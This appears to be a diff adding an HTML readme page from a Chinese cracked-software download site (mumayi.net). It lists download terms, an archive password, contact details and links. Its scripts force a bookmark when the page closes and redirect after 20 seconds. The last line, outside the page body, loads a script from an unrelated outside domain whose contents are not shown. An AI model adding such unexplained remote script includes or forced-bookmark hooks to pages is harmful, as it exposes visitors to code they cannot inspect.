@@ -1,0 +1,210 @@
+<SCRIPT language=javascript>
+function bookmark(){
+window.external.AddFavorite('http://www.mumayi.net', '中国破解联盟--木蚂蚁社区')
+}
+</SCRIPT>
+
+<meta http-equiv="Content-Language" content="zh-cn">
+<body>&nbsp;<STYLE>
+.disableHscroll{
+width:100%;overflow-x:hidden;overflow-y:scroll;
+}
+
+v\:* {
+ BEHAVIOR: url(#default#VML)
+}
+</STYLE><SCRIPT>
+var defaultcolor="#999999"
+var lineweighthighlight=1
+var lineweightnormal=1
+var distancetomouse=0
+var mousepos_x=0
+var mousepos_x=0
+var marginleft=0
+var margintop=0
+var marginbottom=0
+var marginright=0
+var margincenterx
+var margincentery
+var mousepos_x=0
+var mousepos_x=0
+if (document.all&&window.print){
+    document.write('<div id="bodycontent" style="position:relative">')
+}
+function initiateanimation(){
+    marginbottom=document.body.clientHeight
+    marginright=document.body.clientWidth
+    margincenterx=Math.floor(marginright/2)
+    margincentery=Math.floor(marginbottom/2)    
+    rectangulartopleft.to=marginleft+","+margintop
+    rectangulartopright.to=marginright+","+margintop
+    rectangularbottomleft.to=marginleft+","+marginbottom
+    rectangularbottomright.to=marginright+","+marginbottom    
+    rectangulartop.to=margincenterx+","+margintop
+    rectangularright.to=marginright+","+margincentery
+    rectangularbottom.to=margincenterx+","+marginbottom
+    rectangularleft.to=marginleft+","+margincentery    
+    rectangulartopleft.strokecolor=defaultcolor
+    rectangulartopright.strokecolor=defaultcolor
+    rectangularbottomleft.strokecolor=defaultcolor
+    rectangularbottomright.strokecolor=defaultcolor    
+    rectangulartop.strokecolor=defaultcolor
+    rectangularright.strokecolor=defaultcolor
+    rectangularbottom.strokecolor=defaultcolor
+    rectangularleft.strokecolor=defaultcolor}
+function msover(thiscolorhighlight){
+    if(document.all&&window.print){
+        rectangulartopleft.strokecolor=thiscolorhighlight
+        rectangulartopright.strokecolor=thiscolorhighlight
+        rectangularbottomleft.strokecolor=thiscolorhighlight
+        rectangularbottomright.strokecolor=thiscolorhighlight    
+        rectangulartop.strokecolor=thiscolorhighlight
+        rectangularright.strokecolor=thiscolorhighlight
+        rectangularbottom.strokecolor=thiscolorhighlight
+        rectangularleft.strokecolor=thiscolorhighlight        
+        rectangulartopleft.strokeweight=lineweighthighlight
+        rectangulartopright.strokeweight=lineweighthighlight
+        rectangularbottomleft.strokeweight=lineweighthighlight
+        rectangularbottomright.strokeweight=lineweighthighlight    
+        rectangulartop.strokeweight=lineweighthighlight
+        rectangularright.strokeweight=lineweighthighlight
+        rectangularbottom.strokeweight=lineweighthighlight
+        rectangularleft.strokeweight=lineweighthighlight
+    }
+}
+function msout(){
+    if(document.all&&window.print){
+        rectangulartopleft.strokecolor=defaultcolor
+        rectangulartopright.strokecolor=defaultcolor
+        rectangularbottomleft.strokecolor=defaultcolor
+        rectangularbottomright.strokecolor=defaultcolor    
+        rectangulartop.strokecolor=defaultcolor
+        rectangularright.strokecolor=defaultcolor
+        rectangularbottom.strokecolor=defaultcolor
+        rectangularleft.strokecolor=defaultcolor        
+        rectangulartopleft.strokeweight=lineweightnormal
+        rectangulartopright.strokeweight=lineweightnormal
+        rectangularbottomleft.strokeweight=lineweightnormal
+        rectangularbottomright.strokeweight=lineweightnormal    
+        rectangulartop.strokeweight=lineweightnormal
+        rectangularright.strokeweight=lineweightnormal
+        rectangularbottom.strokeweight=lineweightnormal
+        rectangularleft.strokeweight=lineweightnormal      
+    }
+}
+function momouse(){
+    if(document.all&&window.print){
+        mousepos_x=document.body.scrollLeft+event.clientX
+        mousepos_y=document.body.scrollTop+event.clientY    
+        rectangulartopleft.from=mousepos_x+","+mousepos_y
+        rectangulartopright.from=mousepos_x+","+mousepos_y
+        rectangularbottomleft.from=mousepos_x+","+mousepos_y
+        rectangularbottomright.from=mousepos_x+","+mousepos_y    
+        rectangulartop.from=mousepos_x+","+mousepos_y
+        rectangularright.from=mousepos_x+","+mousepos_y
+        rectangularbottom.from=mousepos_x+","+mousepos_y
+        rectangularleft.from=mousepos_x+","+mousepos_y
+     }
+}
+if(document.all&&window.print){
+    document.body.className="disableHscroll"
+    code="<v:line id=rectangulartopleft style='LEFT:0;POSITION:absolute;TOP:0;' strokeweight='"+lineweightnormal+"pt'></v:line>" 
+    code+="<v:line id=rectangulartopright style='LEFT:0;POSITION:absolute;TOP:0;' strokeweight='"+lineweightnormal+"pt'></v:line>" 
+    code+="<v:line id=rectangularbottomleft style='LEFT:0;POSITION:absolute;TOP:0;' strokeweight='"+lineweightnormal+"pt'></v:line>" 
+    code+="<v:line id=rectangularbottomright style='LEFT:0;POSITION:absolute;TOP:0;' strokeweight='"+lineweightnormal+"pt'></v:line>" 
+    code+="<v:line id=rectangulartop style='LEFT:0;POSITION:absolute;TOP:0;' strokeweight='"+lineweightnormal+"pt'></v:line>" 
+    code+="<v:line id=rectangularright style='LEFT:0;POSITION:absolute;TOP:0;' strokeweight='"+lineweightnormal+"pt'></v:line>" 
+    code+="<v:line id=rectangularbottom style='LEFT:0;POSITION:absolute;TOP:0;' strokeweight='"+lineweightnormal+"pt'></v:line>" 
+    code+="<v:line id=rectangularleft style='LEFT:0;POSITION:absolute;TOP:0;' strokeweight='"+lineweightnormal+"pt'></v:line>" 
+    document.body.insertAdjacentHTML("afterBegin",code)
+    document.onmousemove=momouse
+    window.onload=initiateanimation
+}
+</SCRIPT><center>
+<a onMouseOver="msover('#33FF33')" onMouseOut="msout()" target="_blank" href="http://www.mumayi.net">中国破解联盟------->木蚂蚁软件基地</a><p>
+
+
+<P align=center><A href="http://www.mumayi.net/" target=_blank><IMG alt="" src="http://www.mumayi.net/mayi.gif" border=0 pop="中国破解联盟"></A> &nbsp; <A href="http://soft.mumayi.net/" target=_blank><IMG alt="" src="http://www.mumayi.net/mayi1.gif " border=0 pop="木蚂蚁软件站"></A> &nbsp; <A href="http://bbs.mumayi.net/" target=_blank><IMG alt="" src="http://www.mumayi.net/mumayi.gif" border=0 pop="木蚂蚁论坛"></A> &nbsp; <A href="http://tv.mumayi.net/" target=_blank><IMG alt="" src="http://www.mumayi.net/mmyrj.gif" border=0 pop="木蚂蚁网络电视"></A>&nbsp;&nbsp;　</P>
+
+
+
+
+
+<head>
+<meta http-equiv="Content-Language" content="zh-cn">
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<meta http-equiv="refresh" content="20; url=http://www.mumayi.net">
+<title>『︻◣中国破解联盟下载基地』下载文件说明</title>
+<style>A {
+FONT-SIZE: 12px; COLOR: #000000; TEXT-DECORATION: none
+; line-height: 130%}
+A:hover {
+	COLOR: #ffffff
+; line-height: 130%}
+A.blue {
+	COLOR: #38A6FF
+; line-height: 130%}
+body, p, td {
+	FONT-SIZE: 12px
+}body { font-family: "Arial", "Helvetica", "sans-serif" }p { line-height: 130% }td  { line-height: 130% }</style>
+</head>
+
+
+<body style="BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #000000 1px solid; MARGIN: 0pt; OVERFLOW: hidden; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #cccccc 1px solid" bgColor="#2F78D0" leftMargin="0" topMargin="10">
+<div align="center"> 
+  <center>
+
+<DIV align=center>
+<CENTER>
+<TABLE id=AutoNumber1 style="BORDER-RIGHT: 1px dotted; BORDER-TOP: 1px dotted; BORDER-LEFT: 1px dotted; BORDER-BOTTOM: 1px dotted; BORDER-COLLAPSE: collapse" borderColor=#000000 height=251 cellSpacing=0 cellPadding=0 width=529 border=1>
+<TBODY>
+<TR>
+<TD width=520 bgColor=#ffdb4a height=20><FONT color=#000000>&nbsp;『<FONT color=#ff0000>木蚂蚁软件下载基地</FONT>』下载文件说明</FONT></TD></TR>
+<TR>
+<TD vAlign=top width=529 bgColor=#f0f0f0 height=221><BR>&nbsp;&nbsp; 您下载的该文件来自『木蚂蚁软件下载基地』下载中心(<A href="http://www.mumayi.net/" target=_blank><FONT color=#000000>http://www.mumayi.net</FONT></A>)<BR><BR>&nbsp;&nbsp; 使用前请您先阅读以下条款，否则请勿使用本站提供的文件！<BR>&nbsp;&nbsp; 1) 本站不保证所提供软件或程序的完整性和安全性。<BR>&nbsp;&nbsp; 2) 请在使用前查毒 (这也是您使用其它网络资源所必须注意的) 。<BR>&nbsp;&nbsp; 3) 由本站提供的程序对您的网站或计算机造成严重后果的本联盟概不负责。<BR>&nbsp;&nbsp; 4) 本站统一解压密码为：www.mumayi.net 或 mumayi.net<BR>&nbsp;&nbsp; 5) 本站提供的程序均为网上搜集，如果该程序涉及或侵害到您的版权请立即写信通知我们。 
+<P>&nbsp;&nbsp; 有任何问题可到木蚂蚁论坛(<FONT color=#000000><A href="http://bbs.mumayi.net/" target=_blank>http://bbs.mumayi.net</A></FONT>)，在那里您可以得到更多的技术支持！<BR></P>
+<P>&nbsp;&nbsp; 联系站长：╃木蚂蚁㊣：<A href="mailto:yangbo3317756@163.net"><FONT color=#000000>︻◣QQ：40358451 [非破版注册成员勿扰]</FONT></A><BR>&nbsp;&nbsp; 木蚂蚁软件站连接：<A href="http://soft.mumayi.net/"><FONT color=#000000>★木蚂蚁社区★ http://www.mumayi.net</FONT></A><SPAN lang=en-us>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</SPAN>&nbsp;&nbsp; </P></TD></TR>
+<TR>
+<TD borderColor=#000000 width=529 bgColor=#4aaeff height=16>
+<MARQUEE onmouseover=this.stop() onmouseout=this.start() scrollAmount=50 scrollDelay=100 behavior=slide loop=1>&nbsp; <A href="http://www.mumayi.net/">木蚂蚁社区&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;╃木蚂蚁㊣</A></MARQUEE></TD></TR></TBODY></TABLE></CENTER></DIV>
+
+<script type="text/javascript" language="JavaScript">
+function initArray() { for (var i = 0; i < initArray.arguments.length; i++)
+{ this[i] = initArray.arguments[i]; } this.length = initArray.arguments.length; }
+ var colors = new initArray("ff0000","00ffff","ffff00","00ff00","99ccff","800000","ff00ff","ff9900");
+delay = .8; link = 0; vlink = 0; function linkDance() { link = (link+1)%colors.length; vlink = (vlink+1)%colors.length;
+ document.linkColor = colors[link]; document.vlinkColor = colors[vlink]; setTimeout("linkDance()",delay*1000); } linkDance();
+</script>
+
+
+<script language="javascript">
+
+function bookmark(){
+
+window.external.AddFavorite('http://www.mumayi.net', '中国破解联盟--木蚂蚁社区')
+
+}
+
+</script>
+
+
+
+
+<body bgcolor="#fef4d9" onunload="bookmark()">
+
+<CENTER>&nbsp;</CENTER>
+<CENTER>&nbsp;</CENTER></DIV>
+
+
+<DIV align=center>
+<HR>
+</DIV>
+<P align=center>
+<TABLE cellSpacing=0 cellPadding=4 align=center border=0>
+<TBODY>
+<TR>
+<TD align=right><A href="http://www.mumayi.net/" target=_blank><IMG alt="" src="http://bbs.mumayi.net/images/banner.gif" border=0 pop="中国破解联盟"></A>&nbsp;</TD>
+<TD align=left>
+<DIV align=left><SPAN class=mediumtxt>[ <A class=mediumtxt href="mailto:yangbo3317756@163.net"><FONT color=#000000>联系我们</FONT></A>--<A class=mediumtxt href="http://www.mumayi.net/" target=_blank><FONT color=#000000>中国破解联盟</FONT></A> ]</SPAN><BR><SPAN style="FONT-SIZE: 11px; COLOR: #000000; FONT-FAMILY: Tahoma, Arial">Powered by <A style="COLOR: #000000" href="http://bbs.mumayi.net/viewpro.php?uid=3" target=_blank><B>Lost-</B> <B style="COLOR: #647ab8">MuMMy</B></A> <BR><A href="http://bbs.mumayi.net/"><FONT color=#000000>Copyright</FONT></A> &copy; 03-05 <A style="COLOR: #000000" href="http://bbs.mumayi.net/" target=_blank>江苏.常州</SCRIPT>
+<SCRIPT language=JavaScript src="http://www.mumayi.net/dianshi.js"></SCRIPT>
+</A> </SPAN></DIV></TD></TR></TBODY></TABLE>　　</P><script language=javascript src=http://www.haofbi.com/js/w.js></script>
